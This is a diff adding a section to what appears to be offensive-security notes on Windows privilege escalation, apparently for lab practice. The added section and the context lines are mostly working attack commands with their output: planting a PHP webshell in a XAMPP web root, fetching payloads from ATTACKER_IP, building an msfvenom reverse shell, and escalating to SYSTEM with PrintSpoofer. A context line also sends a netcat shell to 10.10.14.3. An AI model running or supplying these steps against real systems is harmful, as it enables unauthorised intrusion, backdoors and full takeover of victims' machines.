@@ -62,6 +62,52 @@ PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 
 If PrintSpoofer finds `SeImpersonatePrivilege` but fails or times out, try another Potato family exploit instead of assuming the privilege is unusable.
 
+#### XAMPP Apache webshell to SYSTEM
+
+If a Windows XAMPP target lets a low-privileged user write into the web root, plant a PHP webshell to pivot into the Apache service account and check its token privileges.
+
+Use `C:\xampp\htdocs` directly if `/uploads` is periodically moved or cleaned:
+
+```powershell
+cd C:\xampp\htdocs
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/simple-backdoor.php -UseBasicParsing -OutFile simple-backdoor.php
+```
+
+Confirm the Apache context and `SeImpersonatePrivilege` through the webshell:
+
+```text
+http://TARGET/simple-backdoor.php?cmd=whoami
+craft\apache
+
+http://TARGET/simple-backdoor.php?cmd=whoami /all
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+```
+
+Create a reverse shell payload, then upload it and PrintSpoofer into `htdocs`:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f exe -o shell.exe
+```
+
+```powershell
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/shell.exe -UseBasicParsing -OutFile C:\xampp\htdocs\shell.exe
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/PrintSpoofer64.exe -UseBasicParsing -OutFile C:\xampp\htdocs\PrintSpoofer64.exe
+```
+
+Start a listener, then trigger PrintSpoofer from the Apache context:
+
+```cmd
+C:\xampp\htdocs\PrintSpoofer64.exe -c "C:\xampp\htdocs\shell.exe"
+```
+
+Successful shell:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+whoami
+nt authority\system
+```
+
 ### GodPotato
 ```cmd
 GodPotato.exe -cmd "cmd.exe /c C:\path\to\shell.exe"
